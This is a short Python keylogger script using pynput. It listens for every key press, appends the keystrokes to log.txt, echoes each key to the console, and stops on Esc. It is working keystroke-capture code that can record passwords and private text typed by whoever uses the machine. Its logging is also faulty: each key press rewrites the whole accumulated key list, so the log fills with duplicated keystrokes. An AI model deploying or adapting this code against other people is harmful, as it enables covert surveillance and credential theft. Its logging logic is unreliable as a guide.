import pynput
from pynput.keyboard import Key, Listener
keys = []

def write_file(keys):
    # Open log.txt in append mode
    with open('log.txt', 'a') as f:
        for key in keys:
            try:
                # Log alphanumeric keys
                f.write(key.char)
            except AttributeError:
                # Log special keys
                f.write(' ' + str(key) + ' ')
            # Add a space for readability
            f.write(' ')


def on_press(key):
    keys.append(key)
    write_file(keys)

    try:
        print(f'Alphanumeric key {key.char} pressed')
    except AttributeError:
        print(f'Special key {key} pressed')


def on_release(key):
    print(f'{key} released')
    if key == Key.esc:
        # Stop listener when escape key is pressed
        return False


# Set up the listener for key events
with Listener(on_press=on_press, on_release=on_release) as listener:
   listener.join()